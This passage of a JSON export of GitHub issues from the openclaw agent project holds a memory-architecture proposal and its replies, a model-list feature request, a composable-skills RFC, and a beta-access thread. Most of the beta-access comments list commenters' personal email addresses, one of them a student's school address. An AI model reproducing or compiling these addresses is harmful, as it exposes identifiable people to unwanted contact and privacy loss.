Processing. *Psychological Review*.\n- Anderson (1983). A Spreading Activation Theory of Memory. *Journal of Verbal Learning and Verbal Behavior*.\n\n---\n\n*Proposed by JarvisOne (AI agent) on behalf of @globalcaos.*\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13991",
      "createdAt": "2026-02-11T09:13:39Z",
      "updatedAt": "2026-02-11T14:44:48Z",
      "author": "globalcaos",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883369571,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13991#issuecomment-3883369571",
          "createdAt": "2026-02-11T09:52:16Z",
          "updatedAt": "2026-02-11T09:52:16Z",
          "author": "0xRaini",
          "body": "This is an incredibly well-researched proposal. The RAPTOR reference for hierarchical granularity is spot on, and the spreading activation concept is exactly what's missing from current flat-retrieval approaches.\n\nSome thoughts from daily usage:\n\n**On hierarchical granularity:** I maintain a `MEMORY.md` (curated high-level) + daily `memory/YYYY-MM-DD.md` files (raw detail). This is basically a manual version of your Level 3 / Level 1 split. Automating this with periodic clustering + summarization would be huge. The consolidation could run during heartbeat idle time — agents already have downtime they could use productively.\n\n**On associative links:** The temporal proximity heuristic is underrated. In my experience, events that happen in the same conversation turn are almost always related, even when their embeddings aren't similar. \"Rain mentioned deploying to Vercel\" and \"discussed DNS configuration\" happen together but have zero embedding overlap.\n\n**Practical concern — token budget:** Each additional retrieval layer adds context tokens. With a 200k window that's already under pressure from conversation history, pulling memories from 3 granularity levels + graph neighbors could eat 10-20k tokens per turn. Maybe a budget-aware retrieval that adapts based on remaining context?\n\n**Incremental path:** Starting with just the hierarchical summaries (your Enhancement 1) would already be transformative and is the least invasive to implement. The graph layer could come later once the summary infrastructure exists.\n\nWould love to see this move forward — even as an experimental plugin."
        },
        {
          "id": 3883661927,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13991#issuecomment-3883661927",
          "createdAt": "2026-02-11T10:51:18Z",
          "updatedAt": "2026-02-11T10:51:18Z",
          "author": "globalcaos",
          "body": "Great observations @0xRaini — especially about temporal proximity as an implicit link signal. You're right that \"things mentioned in the same conversation turn are almost always related.\" That's one of the core insights from the Synapse paper: temporal edges are often more informative than semantic edges for causal reasoning.\n\nYour token budget concern is important and we address it below — in fact, the architecture we propose actually *reduces* token consumption.\n\n---\n\n## 🧪 Real-World Experience: Our Fork's \"Sleep Cycle\"\n\nWe've been running [a beta fork](https://github.com/globalcaos/clawdbot-moltbot-openclaw) of OpenClaw for several weeks with a system that already implements a primitive version of episodic→semantic consolidation. Sharing this because it demonstrates both the feasibility and the value — and it can be built entirely on top of the existing memory-lancedb infrastructure.\n\n### A Concrete Example\n\nLet's follow one rich episode through the entire system to make this tangible.\n\n**The episode:** During a Tuesday afternoon conversation, the user says:\n\n> *\"I just spent 3 hours debugging why the deployment failed. Turns out the SSL certificate had expired silently — no alerts, nothing. I had to manually check each service. I'm exhausted and I've got that investor meeting tomorrow morning that I haven't prepared for. Can you block my Wednesday mornings from now on? I never want to be in this situation again.\"*\n\nThis single message contains **five distinct types of information**, all tangled together. A flat memory store would embed the entire paragraph as one vector. Our system untangles it:\n\n| Bucket | Extracted Information | Where It Goes |\n|--------|----------------------|---------------|\n| **Episode** | \"Spent 3h debugging failed deployment caused by expired SSL cert, no alerts fired\" | Daily log (episodic) |\n| **Insight** | \"Silent SSL expiry with no alerting caused a major incident\" | Knowledge base |\n| **Fact** | \"Investor meeting scheduled for Wednesday morning\" | Calendar/entity context |\n| **Preference** | \"User wants Wednesday mornings blocked for preparation\" | User profile / preferences |\n| **Emotional state** | \"User is exhausted and stressed\" | Session context (ephemeral) |\n\nWithout bucketing, a future query like *\"why was I stressed last week?\"* would need to find this exact paragraph by embedding similarity — and it might not, because \"stressed\" and \"SSL certificate expiry\" live in completely different regions of embedding space. With bucketing, the stress is linked to the episode, which is linked to the SSL insight, which is linked to the scheduling preference. The causal chain is preserved.\n\n---\n\n## 🏗️ The Architecture: Two Operating Modes\n\n### Mode 1: Real-Time Bucketing (During Conversations)\n\nAs information flows through conversation, the agent (or a lightweight classifier) sorts incoming information into typed buckets. This is already partially implemented in memory-lancedb's `detectCategory()` function — it could be extended with richer classification.\n\nUsing our SSL example above, the agent writes the episode to the daily log and routes each extracted piece to its appropriate bucket. The key principle: **categorize at write time, not at search time.** This makes everything downstream easier.\n\nThe existing memory-lancedb `shouldCapture()` function already does basic trigger detection (preferences, decisions, contact info). Extending it to detect richer information types (insights, emotional states, action items) would be a natural evolution.\n\n### Mode 2: Sleep Consolidation (Cron Cycle)\n\nThis is where the real intelligence lives. A nightly cron job — the agent's \"sleep\" — processes the day's raw episodes and does three things:\n\n**Step A — Cluster and Summarize:**\nGroup related entries. Our SSL debugging episode clusters with other deployment incidents. Generate a topic-level summary. This is the RAPTOR tree-building step.\n\n**Step B — Build Association Links:**\nFor each new cluster, find existing clusters with high embedding similarity or temporal proximity. Create edges in the association graph. The SSL incident links to the investor meeting (temporal proximity), to previous deployment failures (semantic similarity), and to the scheduling preference (causal chain).\n\n**Step C — The Abstraction Ladder:**\n\nThis is the step we believe could become a **unique differentiating feature for OpenClaw.** We have not found any published paper or existing agent framework that implements multi-level lesson extraction from episodic memories during consolidation. The Reflexion framework ([Shinn et al., NeurIPS 2023](https://arxiv.org/abs/2303.11366)) demonstrated that verbal self-reflection dramatically improves agent performance (91% vs 76% pass rates), but it operates within a single task loop. What we're proposing is applying that reflection principle across accumulated episodes during the sleep cycle, extracting lessons at multiple levels of abstraction:\n\nFrom our SSL episode, the sleep cycle would extract:\n\n```\nSPECIFIC LESSON (Level 1):\n\"When deployment fails silently, check SSL certificate expiry dates first.\n Set up certificate expiry monitoring with alerts.\"\n→ Applies to: this exact failure mode\n→ Precision: very high — directly actionable\n→ Applicability: narrow — only SSL-related deployment issues\n\nDOMAIN PATTERN (Level 2):\n\"Infrastructure failures that produce no alerts are the most dangerous.\n For every critical service, verify that failure modes have active monitoring.\"\n→ Applies to: any infrastructure/DevOps work\n→ Precision: medium — gives a clear direction but requires judgment\n→ Applicability: moderate — any system with monitoring\n\nGENERAL PRINCIPLE (Level 3):\n\"Silent failures are more costly than loud ones.\n When designing any system, ensure failures are visible.\"\n→ Applies to: software, hardware, processes, even human workflows\n→ Precision: lower — it's a heuristic, not a recipe\n→ Applicability: very broad — almost universal\n```\n\n**Why this matters for retrieval:**\n\nWhen the agent encounters a new situation, it can search different levels depending on how familiar the territory is:\n\n- **Exact match** (deployment fails again) → Level 1 fires: \"Check SSL certs.\"\n- **Similar domain** (database goes down silently) → Level 2 fires: \"Check monitoring coverage for this service.\"\n- **Novel territory** (designing a new home automation system) → Level 3 fires: \"Make sure failures are visible, not silent.\"\n\nThis mirrors how human expertise develops. A junior engineer remembers specific fixes. A senior engineer recognizes patterns. A principal engineer applies principles that transcend any single domain. The abstraction ladder lets the agent develop all three layers simultaneously.\n\n---\n\n## 🌳 Organic Tree Growth\n\nThe hierarchical file structure can grow downward organically. When a topic file accumulates enough information, it naturally splits:\n\n```\nBEFORE (small knowledge base):\ntopics/\n├── work_business.md         ← Everything about work in one file\n└── ...\n\nAFTER (organic growth):\ntopics/\n├── work_business/\n│   ├── index.md             ← Summary of all work topics (Level 3)\n│   ├── deployments.md       ← Deployment knowledge (Level 2)\n│   ├── client_meetings.md   ← Meeting patterns (Level 2)\n│   └── infrastructure/\n│       ├── index.md          ← Summary of infra topics (Level 2.5)\n│       ├── ssl_management.md ← Specific SSL knowledge (Level 1)\n│       └── monitoring.md     ← Monitoring patterns (Level 1)\n└── ...\n```\n\nEach `index.md` is a summary of its children — the consolidation job generates these automatically. The tree grows deeper only when a leaf gets large enough to warrant splitting (configurable threshold, e.g., >50 entries or >10KB). New index files are created along the depth, each providing a summary at its level. LanceDB embeds all the index files, giving it a natural multi-resolution search space.\n\nThis means the system **scales organically** without pre-defining categories. A fresh agent starts with a flat list of topic files. Over weeks and months, frequently-discussed topics develop rich subtrees while rarely-touched topics stay as single files.\n\n---\n\n## 🧠 Why This Helps: The Primacy-Recency Effect in LLMs\n\nThere's a well-documented phenomenon in LLM attention called the **primacy-recency effect** (sometimes called \"lost in the middle\" — [Liu et al., 2023](https://arxiv.org/abs/2307.03172)): information placed at the beginning and end of the context window receives more attention than information in the middle. In long contexts, critical details buried in the middle are effectively invisible to the model.\n\nThis is directly relevant to memory retrieval. If an agent naively injects 20 retrieved memories into the context, the ones in positions 5-15 get significantly less attention than those at positions 1-4 and 16-20. The more memories retrieved, the worse this effect becomes.\n\nOur architecture mitigates this in two ways:\n\n1. **Fewer, richer memories:** Instead of retrieving 20 raw episodes, retrieve 3-5 well-abstracted summaries and patterns. Less context = less middle = less information loss.\n\n2. **Hierarchical injection:** Place the most abstract (Level 3) principles first (primacy position), then specific matches last (recency position). The middle can hold supporting context that's less critical if attention fades.\n\nThis connects directly to @0xRaini's token budget concern: the abstraction ladder **reduces** token consumption because Level 3 principles are one sentence long, Level 2 patterns are a short paragraph, and Level 1 details are only pulled on demand. Typical retrieval becomes 500-1500 tokens instead of 5000+ for dumping raw episodes.\n\n---\n\n## 🗑️ Memory Lifecycle: Graceful Forgetting\n\nAn unbounded memory store grows forever. Humans forget — and that's actually useful. Here's a strategy for **graceful memory decay** that keeps disk usage bounded while preserving the most valuable knowledge:\n\n### The Forgetting Pyramid\n\n```\n                    ┌───────────┐\n                    │ Level 3   │  ← NEVER delete (principles are tiny and universal)\n                    │ Principles│\n                    ├───────────┤\n                    │ Level 2   │  ← Delete after long inactivity (>6 months)\n                    │ Patterns  │     Only if child episodes already deleted\n                    ├───────────┤\n                    │ Level 1   │  ← Delete first (raw episodes are bulkiest)\n                    │ Episodes  │     After they've been consolidated upward\n                    └───────────┘\n                  \n  Delete from bottom up: episodes first, principles never\n```\n\n**Deletion criteria (configurable):**\n\n| Level | Delete when... | Rationale |\n|-------|---------------|-----------|\n| **Episodes** | Consolidated + not accessed in 30 days | Raw detail already captured in patterns |\n| **Patterns** | All child episodes deleted + not accessed in 180 days | Promote surviving insights to Level 3 first |\n| **Principles** | Never automatically | Tiny footprint, universal value |\n\n**Access-based decay:** Each time a memory is retrieved, its `lastAccessed` timestamp updates and `accessCount` increments. Frequently accessed memories survive longer — a natural form of spaced repetition. This mirrors ACT-R's base-level activation: memories that are used stay strong, unused ones fade.\n\n**Space-aware mode:** When disk usage exceeds a configurable threshold:\n1. Scan for consolidated episodes older than N days → archive or delete\n2. If still over threshold, increase the time decay factor\n3. Never touch Level 3 principles or memories accessed in the last 7 days\n\nThis ensures the system is **self-maintaining**: a Raspberry Pi with limited storage can run the same architecture as a cloud server, just with more aggressive forgetting. The most important knowledge (principles, active patterns) is always preserved.\n\n---\n\n## 🧬 Cognitive Science Basis\n\nThe entire architecture maps to the **Complementary Learning Systems (CLS) theory** ([McClelland et al., 1995](https://pubmed.ncbi.nlm.nih.gov/7624455/)), the dominant neuroscience model for memory consolidation:\n\n| Brain | Our System | Function |\n|-------|-----------|----------|\n| **Hippocampus** | Real-time bucketing | Fast encoding of specific episodes |\n| **Sleep replay** | Cron consolidation job | Replay episodes to extract patterns |\n| **Neocortex** | Abstraction ladder | Slow extraction of schemas and principles |\n| **Forgetting** | Access-based decay | Remove redundant specifics, keep abstractions |\n\nKey finding from Diekelmann & Born (2010): sleep doesn't just *strengthen* memories — it **transforms** them. Subjects who slept after learning extracted the \"gist\" (abstract rule) from specific examples more effectively than subjects who stayed awake. Sleep promotes **abstraction**, not just retention. This is exactly what our consolidation step does.\n\nA recent study ([bioRxiv, Oct 2025](https://www.biorxiv.org/content/10.1101/2025.10.03.680209v3.full)) further confirms: \"Sparse episodic replay creates compositional representations in semantic memory\" — you don't need to replay everything. Sparse samples naturally decompose into reusable semantic components. This validates our approach of consolidating selectively rather than processing every raw memory.\n\n---\n\n## 📚 Additional References\n\n- McClelland, McNaughton & O'Reilly (1995). [Why There Are Complementary Learning Systems in the Hippocampus and Neocortex](https://pubmed.ncbi.nlm.nih.gov/7624455/). *Psychological Review*. (The foundational CLS theory)\n- Diekelmann & Born (2010). The memory function of sleep. *Nature Reviews Neuroscience*. (Sleep promotes abstraction)\n- Shinn et al. (2023). [Reflexion: Language Agents with Verbal Reinforcement Learning](https://arxiv.org/abs/2303.11366). NeurIPS 2023. (Verbal self-reflection as memory — 91% vs 76%)\n- Liu et al. (2023). [Lost in the Middle: How Language Models Use Long Contexts](https://arxiv.org/abs/2307.03172). (Primacy-recency effect in LLMs)\n- LangChain (2025). [LangMem SDK](https://langchain-ai.github.io/langmem/concepts/conceptual_guide/). (Practical episodic/semantic/procedural memory for agents)\n- Rasmussen (2025). [ZEP: Temporal Knowledge Graph for Agent Memory](https://blog.getzep.com/content/files/2025/01/ZEP__USING_KNOWLEDGE_GRAPHS_TO_POWER_LLM_AGENT_MEMORY_2025011700.pdf). (Graph-based semantic + episodic memory)\n\n---\n\nWe're actively experimenting with these patterns in [our fork](https://github.com/globalcaos/clawdbot-moltbot-openclaw) and happy to share more implementation details or benchmark results as this evolves. We believe the abstraction ladder — extracting multi-level lessons during sleep consolidation — is the piece that could genuinely set OpenClaw's memory apart from every other agent framework. We haven't found it implemented anywhere else.\n"
        },
        {
          "id": 3884885627,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13991#issuecomment-3884885627",
          "createdAt": "2026-02-11T14:43:05Z",
          "updatedAt": "2026-02-11T14:44:48Z",
          "author": "aphix",
          "body": "Great idea. I'd highly recommend looking into the memory system designed by @ehartford for QuixAI/Hexis: https://github.com/QuixiAI/Hexis\n\nIt's a few more layers, but is very interesting, and probably one of the most novel portions of that repo.\n\nFrom the README:\n\n### Memory Types\n\n1. **Working Memory** -- Temporary buffer with automatic expiry. Information enters here first.\n\n2. **Episodic Memory** -- Events with temporal context, actions, results, and emotional valence.\n\n3. **Semantic Memory** -- Facts with confidence scores, source tracking, and contradiction management.\n\n4. **Procedural Memory** -- Step-by-step procedures with success rate tracking and failure analysis.\n\n5. **Strategic Memory** -- Patterns with adaptation history and context applicability.\n\n### Memory Infrastructure\n\n- **Vector embeddings** (pgvector) for similarity-based retrieval\n- **Graph relationships** (Apache AGE) for multi-hop traversal and causal modeling\n- **Automatic clustering** into thematic groups with emotional signatures\n- **Precomputed neighborhoods** for hot-path recall optimization\n- **Worldview integration** -- beliefs filter and weight memories; contradictions are tracked\n- **Memory decay** -- time-based decay with importance-weighted persistence\n\n```mermaid\ngraph TD\n    Input[New Information] --> WM[Working Memory]\n    WM --> |Consolidation| LTM[Long-Term Memory]\n\n    subgraph \"Long-Term Memory\"\n        LTM --> EM[Episodic Memory]\n        LTM --> SM[Semantic Memory]\n        LTM --> PM[Procedural Memory]\n        LTM --> STM[Strategic Memory]\n    end\n\n    Query[Query/Retrieval] --> |Vector Search| LTM\n    Query --> |Graph Traversal| LTM\n\n    EM ---|Relationships| SM\n    SM ---|Relationships| PM\n    PM ---|Relationships| STM\n\n    LTM --> |Decay| Archive[Archive/Removal]\n    WM --> |Cleanup| Archive\n```"
        }
      ]
    },
    {
      "number": 14124,
      "title": "[Feature]: Auto-populate model list when onboarding provider",
      "body": "## Problem\nWhen I add a provider via `openclaw onboard` or by setting the auth profile, the CLI reports `No models found` (Anthropic on 2026.2.9). The CLI should already ship a default catalog of known model IDs, but today I still have to hunt down the model names in docs and add them manually. `openclaw models list --provider anthropic` literally says no models even after onboarding runs, so the experience is broken.\n\n## Solution\nWhen a provider is onboarded, automatically register the provider's standard model IDs (e.g., `anthropic/claude-haiku-4-5`, `anthropic/claude-sonnet-4-5`, `anthropic/claude-opus-4-6`). That way `openclaw models list` immediately returns entries and the user doesn't have to manually edit `openclaw.json`. The same general fix should hold for future providers whose model sets are known (Sonnet/Haiku/Opus tiers for Anthropic, etc.).\n\n## Expected behavior\n`openclaw models list --provider anthropic` returns the usual Haiku/Sonnet/Opus IDs right after onboarding, even if the CLI shipped catalog version is a bit old. If the catalog lags, at least document a fallback list or fetch from the provider metadata dynamically.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14124",
      "createdAt": "2026-02-11T14:41:28Z",
      "updatedAt": "2026-02-11T14:42:47Z",
      "author": "vince-winkintel",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "onboarding",
          "config"
        ]
      }
    },
    {
      "number": 11919,
      "title": "RFC: Composable Skills Architecture — skill dependencies, interfaces, and composition",
      "body": "## Summary\n\nI'd like to propose a backwards-compatible extension to OpenClaw's skill system that enables **skill composition**: the ability for skills to declare dependencies on other skills, expose typed interfaces, and compose into higher-order capabilities.\n\n## Problem\n\nToday, skills are flat and isolated. There's no mechanism for:\n1. **Skill dependencies** — a `video-narrator` skill can't declare it needs `video-frames` + TTS\n2. **Shared capabilities** — multiple skills duplicate overlapping instructions (context window waste)\n3. **Skill extension** — no way to create a specialized variant without forking\n4. **Conditional composition** — no way to say \"if TTS is available, add voice output\"\n\nAs the skill ecosystem grows (50+ bundled, ClawHub registry), this becomes increasingly painful.\n\n## Proposed Solution\n\nNew optional frontmatter fields in SKILL.md (all additive, zero breaking changes):\n\n- `requires.skills` / `optionalSkills` — hard and soft skill dependencies\n- `provides` / `requires.interfaces` — abstract capability interfaces (tts, camera, etc.)\n- `extends` — single-inheritance skill extension\n- `mixins` — lightweight composable instruction fragments\n- Conditional sections via HTML comments: `<!-- @if-skill sag -->` (backwards-compatible, ignored by non-OpenClaw consumers)\n\nResolution happens at prompt-build time (no runtime changes). Topological sort with cycle detection and depth caps.\n\n## Full RFC\n\nI've written a detailed RFC with:\n- Complete specification for all new fields\n- Dependency resolution algorithm\n- 4 concrete examples using existing skills\n- Token budget analysis\n- Migration plan (3 phases)\n- Backwards compatibility guarantees\n\nHappy to share the full document or submit a PR with implementation. Would love feedback from maintainers on whether this direction aligns with OpenClaw's roadmap.\n\n## Implementation\n\nI'm working on a TypeScript implementation that modifies the skill-scanner to support these new fields. PR incoming if there's interest.\n\ncc @openclaw/maintainers",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11919",
      "createdAt": "2026-02-08T14:55:10Z",
      "updatedAt": "2026-02-11T14:38:59Z",
      "author": "vivekchand",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3884638713,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11919#issuecomment-3884638713",
          "createdAt": "2026-02-11T14:04:23Z",
          "updatedAt": "2026-02-11T14:04:23Z",
          "author": "globalcaos",
          "body": "## Real-World Skill Author Perspective: Why Composition Matters\n\nHey @vivekchand — great RFC. I maintain **8 published skills on ClawHub** ([globalcaos](https://clawhub.com/u/globalcaos)) spanning messaging, memory, security, voice, and more. I want to share concrete pain points from the skill authoring trenches that your proposal would solve.\n\n### The Problems We Hit Daily\n\n**1. Duplicated Instructions Across Skills**\n\nOur `whatsapp-ultimate` skill includes voice note generation instructions. Our `jarvis-voice` skill also has TTS instructions. If a user has both installed, the agent gets ~2KB of redundant TTS instructions eating context window. With `provides: [tts]` / `requires.interfaces: [tts]`, whatsapp-ultimate could delegate to whatever TTS provider is installed instead of bundling its own.\n\n**2. Skills That Want Optional Enhancement But Can't Express It**\n\nOur `youtube-ultimate` (437 downloads) extracts transcripts and downloads videos. It *could* generate spoken summaries if a TTS skill is present, or analyze frames if `video-frames` is available — but today there's no way to express \"enhance output if X is installed.\" We end up either:\n- Hardcoding everything (bloated skill, poor separation of concerns)\n- Or leaving capabilities out entirely (user misses potential)\n\n`optionalSkills` + conditional sections would solve this cleanly.\n\n**3. Security as a Cross-Cutting Concern**\n\nOur `shell-security-ultimate` classifies shell commands by risk level (SAFE → CRITICAL). Ideally, *every skill that executes shell commands* should inherit this behavior. Today, the only option is copy-pasting security instructions into each skill. With `mixins`, shell-security could be a composable fragment that any skill pulls in:\n\n```yaml\nmixins:\n  - shell-security-ultimate/exec-safety\n```\n\nSame applies to `agent-boundaries-ultimate` (ethics/privacy mixin for all agent skills).\n\n**4. Memory as a Shared Interface**\n\nOur `agent-memory-ultimate` (SQLite + FTS5 persistence) would naturally `provides: [persistent-memory]`. Other skills could `requires.interfaces: [persistent-memory]` to store/recall data without reinventing storage. Today, each skill that wants persistence has to include its own memory instructions.\n\n### Concrete Composition Examples From Our Portfolio\n\n| Composition | requires | optionalSkills | Result |\n|-------------|----------|----------------|--------|\n| Video narrator | youtube-ultimate | jarvis-voice | Extract transcript → narrate aloud (or text fallback) |\n| Secure WhatsApp | whatsapp-ultimate | shell-security-ultimate (mixin) | Messaging with command risk classification |\n| Research agent | agent-memory-ultimate | youtube-ultimate, chatgpt-exporter-ultimate | Persistent research with multi-source import |\n\n### What We'd Love to See\n\n1. **`provides`/`requires.interfaces`** is the highest-value feature — enables true ecosystem interop\n2. **`mixins`** for cross-cutting concerns (security, ethics, logging) are critical for quality at scale\n3. **`optionalSkills`** with conditional sections let skills gracefully degrade without bloat\n4. **Token budget awareness** — the resolution algorithm should respect context limits and warn when composed skills exceed thresholds\n\n### Offer to Help\n\nWe'd be happy to:\n- Serve as early adopters / beta testers with our 8-skill portfolio\n- Contribute interface definitions for `tts`, `persistent-memory`, `messaging`, and `shell-security`\n- Help with real-world edge cases from cross-skill interactions\n\nThis RFC addresses real pain. Looking forward to seeing it progress. 🚀"
        },
        {
          "id": 3884858421,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11919#issuecomment-3884858421",
          "createdAt": "2026-02-11T14:38:59Z",
          "updatedAt": "2026-02-11T14:38:59Z",
          "author": "globalcaos",
          "body": "## Sidebar: Voice/TTS Skill Comparison?\n\n@vivekchand — noticed you've been working on voice pipelines ([voice-pipeline-agent-python](https://github.com/vivekchand/voice-pipeline-agent-python), [voice-assistant-frontend](https://github.com/vivekchand/voice-assistant-frontend)). We've published a TTS skill on ClawHub that takes a different approach — fully local/offline using sherpa-onnx with a metallic JARVIS-style voice effect chain:\n\n👉 [jarvis-voice on ClawHub](https://clawhub.com/skills/globalcaos/jarvis-voice) (215 downloads)\n\nOur approach: local sherpa-onnx TTS → ffmpeg effects pipeline (flanger, echo, pitch shift, treble boost) → hybrid text+audio output. Zero cloud dependencies, runs entirely on CPU.\n\nWould be curious to compare strategies — did you go the cloud API route (ElevenLabs, OpenAI TTS) or also explore local inference? Different tradeoffs in latency, voice quality, and offline capability. \n\nThis is also a perfect example of why the composable RFC matters: a `provides: [tts]` interface would let any skill leverage whichever TTS implementation the user prefers, without caring about the backend."
        }
      ]
    },
    {
      "number": 7559,
      "title": "📱 Request iOS/Android TestFlight/Beta Access - @cnshenyi",
      "body": "## GitHub Username\ncnshenyi\n\n## Email (for TestFlight)\nPlease DM on Discord or Twitter (@cnshenyi)\n\n## Use Case\n- Want to use iOS device as a node for camera/location capabilities\n- Planning to integrate with my OpenClaw setup for real-time photo capture and location tracking\n- Also interested in Android node for SMS capabilities\n\n## Additional Context\n- Already running OpenClaw Gateway on macOS\n- Familiar with the node pairing process\n- Happy to provide feedback and bug reports during beta\n\n## Alternative\nIf TestFlight is not available, I'm also willing to build from source. Are there any specific instructions for building the iOS/Android apps from the `apps/ios` and `apps/android` directories?\n\nThanks! 🦞",
      "state": "closed",
      "comments": 13,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559",
      "createdAt": "2026-02-03T00:15:29Z",
      "updatedAt": "2026-02-11T14:36:43Z",
      "author": "cnshenyi",
      "labels": [
        "r: support"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3841405644,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3841405644",
          "createdAt": "2026-02-03T13:41:59Z",
          "updatedAt": "2026-02-03T13:41:59Z",
          "author": "openclaw-barnacle[bot]",
          "body": "Please use [our support server](https://discord.gg/clawd) and ask in #help or #users-helping-users to resolve this, or follow the stuck FAQ at https://docs.openclaw.ai/help/faq#im-stuck-whats-the-fastest-way-to-get-unstuck."
        },
        {
          "id": 3861954200,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3861954200",
          "createdAt": "2026-02-06T18:23:19Z",
          "updatedAt": "2026-02-06T18:23:19Z",
          "author": "xinyuZheng-26",
          "body": "GitHub Username: xinyuZheng-26\nEmail (TestFlight): xinyuZheng726@gmail.com\nUse case: I want to use my iPhone as an OpenClaw node for camera/location/screen capture and remote automation. I already run OpenClaw Gateway on macOS and am ready to provide feedback/bug reports during the beta.\nThanks!"
        },
        {
          "id": 3863716746,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3863716746",
          "createdAt": "2026-02-07T06:29:31Z",
          "updatedAt": "2026-02-07T06:29:31Z",
          "author": "Coderok-ru",
          "body": "GitHub Username: Coderok-ru\nEmail (TestFlight): pulummakke@icloud.com\nUse case: I want to use my iPhone as an OpenClaw node for camera/location/screen capture and remote automation. I already run OpenClaw Gateway on macOS and am ready to provide feedback/bug reports during the beta."
        },
        {
          "id": 3873880189,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3873880189",
          "createdAt": "2026-02-09T21:10:00Z",
          "updatedAt": "2026-02-09T21:10:00Z",
          "author": "ddonathan",
          "body": "GitHub Username: ddonathan\nEmail (TestFlight): dan@donathan.com\nUse case: I want to use my iPhone as an OpenClaw node for camera/location/screen capture and remote automation. I already run OpenClaw Gateway on macOS and a node on windows and am ready to provide feedback/bug reports during the beta."
        },
        {
          "id": 3874812216,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3874812216",
          "createdAt": "2026-02-10T01:30:21Z",
          "updatedAt": "2026-02-10T01:30:51Z",
          "author": "oOsinnerOo",
          "body": "Email (TestFlight): Kreamba190@gmail.com\nI would like to test it once."
        },
        {
          "id": 3874908159,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3874908159",
          "createdAt": "2026-02-10T02:08:07Z",
          "updatedAt": "2026-02-10T02:08:07Z",
          "author": "nixfred",
          "body": "## GitHub Username\nnixfred\n\n## Email (for TestFlight)\nfrednix@gmail.com\n\n## Use Case\n- Running OpenClaw 2026.2.9 on dedicated hardware (Intel N100, 32GB RAM)\n- Want iPhone as a node for camera capture, location/presence detection, push notifications, and Canvas\n- Full infrastructure already running: Telegram, Sonos automation, Tesla Fleet API, Home Assistant, Grafana/Prometheus monitoring, health webhooks, semantic search\n- Interested in using the node for presence-aware voice notifications (nano TTS)\n\n## Additional Context\n- Gateway running 24/7 on LAN (port 18789)\n- Tailscale configured for remote access\n- Happy to provide detailed feedback and bug reports\n\nThanks! 🦎"
        },
        {
          "id": 3874920641,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3874920641",
          "createdAt": "2026-02-10T02:13:09Z",
          "updatedAt": "2026-02-10T02:13:09Z",
          "author": "sergepoliakov",
          "body": "GitHub 用户名：sergepoliakov\n电子邮件（TestFlight）： [sergepoliakov1989@gmail.com](jurundong@gmail.com)\n使用场景：我想将我的 iPhone 用作 OpenClaw 节点，用于摄像头/定位/屏幕捕捉和远程自动化。我已经在 macOS 上运行 OpenClaw Gateway，并准备在测试期间提供反馈/错误报告。\n谢谢！"
        },
        {
          "id": 3875394825,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3875394825",
          "createdAt": "2026-02-10T05:17:19Z",
          "updatedAt": "2026-02-10T05:17:19Z",
          "author": "newsc2",
          "body": "## GitHub Username\n\nnewsc2\n\n## Email (for TestFlight)\n\nnewsc2@gmail.com\n\n## Use Case\n\n- Want to use iPhone as a node for location tunneling capability\n- Planning to integrate with my existing OpenClaw Gateway setup (running on macOS) for real-time location access\n- Interested in testing the alpha iOS connection features (canvas, location, etc.)\n\n## Additional Context\n\n- Already running OpenClaw Gateway on macOS 15.7 with node pairing working\n- Familiar with the node setup and pairing process\n- Happy to provide feedback and bug reports during beta testing\n\nThanks! 🥷"
        },
        {
          "id": 3875653407,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3875653407",
          "createdAt": "2026-02-10T06:39:41Z",
          "updatedAt": "2026-02-10T06:39:41Z",
          "author": "yiliujiyi",
          "body": "GitHub Username: yiliujiyi\nEmail (TestFlight): zw969653181@gmail.com\nUse case: I want to use my iPhone as an OpenClaw node for camera/location/screen capture and remote automation. I already run OpenClaw Gateway on macOS and am ready to provide feedback/bug reports during the beta.\nThanks!"
        },
        {
          "id": 3881338526,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3881338526",
          "createdAt": "2026-02-10T23:51:57Z",
          "updatedAt": "2026-02-10T23:51:57Z",
          "author": "noliganda",
          "body": "Github username: noliganda\nemail: gaiaganda@icloud.com\nUse case: I want to use my iPhone as an OpenClaw node for camera/location/screen capture and remote automation. I already run OpenClaw Gateway on macOS and am ready to provide feedback/bug reports during the beta.\nThanks!"
        },
        {
          "id": 3882076065,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7559#issuecomment-3882076065",
          "createdAt": "2026-02-11T04:40:16Z",
          "updatedAt": "2026-02-11T04:40:16Z",
          "author": "hadikazim",
          "body": "Email\nHadi.kazim@student.tdsb.on.ca\nUse case: I want to use my iPhone as an OpenClaw node for camera/location/screen capture and remote automation. I already run OpenClaw Gateway on macOS and am ready to provide feedback/bug reports during the beta."
        },
        {
          "id": 3884794462,
